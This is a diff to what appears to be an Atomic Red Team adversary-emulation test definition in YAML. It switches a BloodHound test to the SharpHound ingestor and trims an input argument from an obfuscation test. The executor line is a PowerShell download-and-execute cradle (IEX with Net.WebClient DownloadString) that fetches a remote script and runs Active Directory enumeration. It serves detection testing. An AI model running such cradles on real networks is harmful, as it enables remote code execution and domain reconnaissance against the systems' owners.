@@ -32,12 +32,12 @@ atomic_tests:
     bloodurl:
       description: BloodHound URL
       type: url
-      default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1
+      default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1
 
   executor:
     name: command_prompt
     command: |
-      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{bloodurl}'); Get-BloodHoundData"
+      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{bloodurl}'); Invoke-BloodHound"
 
 - name: Obfuscation Tests
   description: |
@@ -46,13 +46,7 @@ atomic_tests:
 
   supported_platforms:
     - windows
-
-  input_arguments:
-    bloodurl:
-      description: BloodHound URL
-      type: url
-      default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1
-
+    
   executor:
     name: powershell
     command: |
